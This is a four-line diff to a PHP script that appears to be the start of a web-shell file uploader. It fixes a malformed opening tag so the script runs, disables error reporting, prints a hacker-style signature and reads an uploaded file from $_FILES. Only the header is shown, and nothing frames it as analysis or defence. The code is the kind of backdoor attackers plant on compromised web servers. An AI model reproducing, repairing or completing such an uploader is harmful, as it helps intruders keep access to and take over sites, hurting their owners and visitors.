@@ -1,4 +1,4 @@
-<<?php
+<?php
 error_reporting(0);
 echo "\n<br><br> M4DI~UciH4";
 $saw1 = $_FILES['file']['tmp_name'];
